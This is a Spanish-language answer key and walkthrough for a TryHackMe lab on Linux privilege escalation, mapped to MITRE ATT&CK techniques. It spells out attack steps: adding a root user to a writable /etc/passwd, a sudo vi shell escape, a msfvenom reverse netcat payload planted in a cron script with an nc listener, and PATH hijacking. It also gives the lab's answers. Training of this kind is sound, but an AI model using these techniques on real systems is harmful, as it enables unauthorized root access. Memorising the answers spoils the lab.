# Common Linux Privesc

| **Dificultad** | Easy |
| **Tipo** | Escalada de privilegios (laboratorio) |
| **Slug** | `commonlinuxprivesc` |
| **Link** | [TryHackMe](https://tryhackme.com/room/commonlinuxprivesc) |
| **Sección** | 01 Level Easy |
| **Fuente** | TryHackMe |
| **Componentes** | SSH / LinEnum / Kernel exploits / sudo / SUID / Crontab / PATH |
| **Impacto** | Laboratorio guiado sobre las técnicas más comunes de escalada de privilegios en Linux: de un usuario normal a root mediante enumeración, exploits de kernel, archivos SUID, crontab y manipulación de la variable PATH. |

---

**Contexto:** La sala explica la escalada de privilegios en Linux y cómo pasar de un usuario de bajos privilegios a root. Comienza con la enumeración del sistema (LinEnum), sigue con el abuso de binarios SUID, la escritura de `/etc/passwd`, la escapada del editor vi por sudo, el secuestro de cronjobs con reverse shells de msfvenom y termina manipulando la variable PATH para que un script SUID ejecute un binario falso.

## Solucionario

### Task 1: Conexión

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Despliega la máquina y conéctate a la red de TryHackMe. | `No answer needed` |

### Task 2: Comprendiendo la escalada de privilegios

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la información sobre escalada de privilegios. | `No answer needed` |

### Task 3: Dirección de la escalada de privilegios

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Entiende la diferencia entre escalada horizontal y vertical. | `No answer needed` |

### Task 4: Enumeración

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Conéctate por SSH al objetivo con las credenciales usero:password. | `No answer needed` |
| 2 | ¿Cuál es el hostname del sistema objetivo? | `polobox` |
| 3 | Mira el archivo /etc/passwd. ¿Cuántas cuentas "user[x]" hay en el sistema? | `8` |
| 4 | ¿Cuántas shells disponibles hay en el sistema? | `4` |
| 5 | ¿Cómo se llama el script bash que se ejecuta cada 5 minutos por cron? | `autoscript.sh` |
| 6 | ¿Qué archivo crítico ha cambiado sus permisos para permitir que algunos usuarios escriban en él? | `/etc/passwd` |
| 7 | Ten en cuenta los resultados de la enumeración para continuar explotando el sistema. | `No answer needed` |

### Task 5: Abusando de archivos SUID/GUID

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué archivo del directorio de user3 destaca sobre los demás? | `/home/user3/shell` |
| 2 | Sabemos que "shell" tiene el bit SUID activado; ¡ejecútalo como root y explótalo! | `No answer needed` |
| 3 | Usa "su" para cambiarte a user8 con la contraseña "password". | `No answer needed` |

### Task 6: Explotando el kernel

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Sigue la guía de explotación del kernel contra la máquina objetivo. | `No answer needed` |
| 2 | ¿Qué tipo de escalada de privilegios permite un usuario no privilegiado pasar a ser root? | `vertical` |
| 3 | ¿Cuál es la contraseña hash generada para el nuevo usuario root? | `$1$new$p7ptkEKU1HnaHpRtzNizS1` |
| 4 | Investiga cómo escribir correctamente la línea de /etc/passwd. ¿Cuál es la línea completa del nuevo usuario root? | `new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash` |
| 5 | Añade la línea al archivo /etc/passwd y cambia de usuario a root. | `No answer needed` |
| 6 | Comprueba tus permisos con "id" al haber pasado a root. | `No answer needed` |

### Task 7: Explotando sudo

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Sal de root con "exit" y usa "su" para pasarte al usuario del laboratorio. | `No answer needed` |
| 2 | Usa el comando "sudo -l". ¿Qué requiere (o no requiere) este usuario para ejecutar vi como root? | `NOPASSWD` |
| 3 | Abre vi como root escribiendo "sudo vi" en la terminal. | `No answer needed` |
| 4 | Escribe ":!sh" para abrir una shell como root. | `No answer needed` |

### Task 8: Explotando Crontab

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Sal de root con "exit" y usa "su" para pasarte a user4 con la contraseña "password". | `No answer needed` |
| 2 | Ahora, en tu máquina atacante, crea un payload para el exploit de cron usando msfvenom. | `No answer needed` |
| 3 | ¿Cuál es la bandera de msfvenom para especificar un payload? | `-p` |
| 4 | Crea un payload usando: `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R` | `No answer needed` |
| 5 | ¿En qué directorio se encuentra el archivo "autoscript.sh"? | `/home/user4/Desktop` |
| 6 | Sustituye el contenido del archivo por tu payload con `echo [SALIDA MSFVENOM] > autoscript.sh`. | `No answer needed` |
| 7 | Espera a que cron ejecute el archivo y arranca un listener con `nc -lvnp 8888`. | `No answer needed` |
| 8 | Pasados unos 5 minutos deberías recibir una shell como root. | `No answer needed` |

### Task 9: Explotando la variable PATH

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Ve al directorio home de user5 y ejecuta el archivo "script" para entender qué hace. | `No answer needed` |
| 2 | ¿Qué comando crees que está ejecutando el script? | `ls` |
| 3 | Crea tu propia imitación ejecutable del comando llamada "ls" en /tmp. | `No answer needed` |
| 4 | ¿Qué comando escribe la siguiente línea en el archivo: `echo "/bin/bash" > ls`? | `echo "/bin/bash" > ls` |
| 5 | ¿Qué comando hace que tu imitación "ls" sea ejecutable? | `chmod +x ls` |
| 6 | Cambia la variable PATH para que apunte al directorio de tu imitación con `export PATH=/tmp:$PATH`. | `No answer needed` |
| 7 | Vuelve al directorio home de user5. | `No answer needed` |
| 8 | Ejecuta de nuevo el archivo "script": deberías obtener una shell de root. | `No answer needed` |

### Task 10: Resumen

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Repasa las técnicas aprendidas para escalar privilegios en Linux. | `No answer needed` |

---

**Metodología:** Se entra por SSH con un usuario de bajos privilegios y se automatiza la enumeración (hostname, usuarios y shells de /etc/passwd y /etc/shells, cronjobs en /etc/crontab, archivos escribibles) con LinEnum. Cada hallazgo se explota por separado: el binario SUID da shell inmediata, se escribe un usuario root en un /etc/passwd escribible usando `openssl` para generar el hash MD5crypt, se escapa de vi vía sudo NOPASSWD, se inyecta un payload de msfvenom en autoscript.sh ejecutado por cron y, por último, se secuestra la ruta del comando "ls" (que el script SUID invoca sin ruta absoluta) manipulando la variable PATH.

**Learning chain:** enumeración → SUID → exploits de kernel → abuso de sudo → cronjobs → manipulación del PATH.

**MITRE ATT&CK:** T1068 (Exploitation for Privilege Escalation), T1548 (Abuse Elevation Control Mechanism), T1548.001 (Setuid and Setgid), T1053.003 (Scheduled Task/Job: Cron), T1574.007 (Path Hijacking), T1222 (File and Directory Permissions Modification)

**Fuente:** [TryHackMe - Common Linux Privesc](https://tryhackme.com/room/commonlinuxprivesc)